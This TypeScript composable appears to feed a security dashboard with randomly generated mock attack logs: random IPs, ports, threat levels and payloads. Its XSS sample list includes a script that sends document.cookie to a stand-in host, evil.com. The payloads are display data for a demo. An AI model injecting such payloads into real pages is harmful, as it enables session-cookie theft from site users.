import { useAttackStore } from "@/stores/attackStore";
import type { ThreatLevel, AttackStatus, AttackLog } from "@/types/attack";

// ✅ 將 intervalId 移到外部，成為單例（所有元件共享）
let intervalId: number | null = null;

export const useMockStream = () => {
  const attackStore = useAttackStore();

  // 生成隨機 IPv4 地址
  const generateRandomIP = (): string => {
    const octet = () => Math.floor(Math.random() * 256);
    return `${octet()}.${octet()}.${octet()}.${octet()}`;
  };

  // 生成隨機端口 (1-65535)
  const generateRandomPort = (): number => {
    return Math.floor(Math.random() * 65535) + 1;
  };

  // 生成隨機威脅等級
  const generateRandomThreatLevel = (): ThreatLevel => {
    const levels: ThreatLevel[] = ["INFO", "WARNING", "CRITICAL"];
    const weight = [0.6, 0.3, 0.1]; // 60% INFO, 30% WARNING, 10% CRITICAL

    const random = Math.random();
    let sum = 0;

    for (let i = 0; i < levels.length; i++) {
      sum += weight[i] ?? 0;
      if (random < sum) return levels[i] ?? "INFO";
    }

    return "INFO";
  };

  // 生成隨機攻擊狀態
  const generateRandomAttackStatus = (): AttackStatus => {
    const status: AttackStatus[] = ["BLOCKED", "SUCCESS", "PENDING"];
    const weight = [0.7, 0.2, 0.1];

    const random = Math.random();
    let sum = 0;

    for (let i = 0; i < status.length; i++) {
      sum += weight[i] ?? 0;
      if (random < sum) return status[i] ?? "BLOCKED";
    }

    return "BLOCKED";
  };

  // XSS Payload 範例（10% 機率）
  const xssPayloads = [
    "<script>alert('XSS')</script>",
    "<script>document.cookie</script>",
    "<img src=x onerror=alert('pwned')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
  ];
  // 正常 Payload 範例（90% 機率）
  const normalPayloads = [
    "GET /api/users",
    "POST /api/login",
    "SELECT * FROM users",
    "GET /api/products?id=123",
    "PUT /api/users/456",
    "DELETE /api/sessions/789",
    "GET /health",
    "POST /api/orders",
    "GET /api/dashboard",
    "PATCH /api/settings",
    "GET /static/css/main.css",
    "POST /api/comments",
    "GET /api/notifications",
    "WebSocket connection established",
    "GET /favicon.ico",
  ];

  // 生成隨機 payload
  const generatePayload = (): string => {
    const isXSS = Math.random() < 0.1; // 10% 機率

    if (isXSS) {
      return xssPayloads[Math.floor(Math.random() * xssPayloads.length)]!;
    } else {
      return normalPayloads[Math.floor(Math.random() * normalPayloads.length)]!;
    }
  };

  // 生成完整的 Mock 日誌
  const generateMockLog = (): AttackLog => {
    return {
      id: crypto.randomUUID(),
      timestamp: Date.now(),
      source_ip: generateRandomIP(),
      target_port: generateRandomPort(),
      payload: generatePayload(),
      level: generateRandomThreatLevel(),
      status: generateRandomAttackStatus(),
    };
  };

  // 啟動資料流
  const startStream = () => {
    if (intervalId !== null) return; // 防止重複啟動
    // 每 50-200ms 生成一筆新日誌
    const generateLog = () => {
      const log = generateMockLog();
      attackStore.addLog(log);
      // 隨機間隔時間 (50-200ms)
      const delay = Math.floor(Math.random() * 150) + 50;
      intervalId = window.setTimeout(generateLog, delay);
    };
    generateLog(); // 立即執行第一次
  };

  // 停止資料流
  const stopStream = () => {
    if (intervalId !== null) {
      clearTimeout(intervalId);
      intervalId = null;
    }
  };

  // 元件卸載時自動清理 - 移除此邏輯以支援跨頁面持續串流
  // onUnmounted(() => {
  //   stopStream();
  // });

  return {
    startStream,
    stopStream,
  };
};
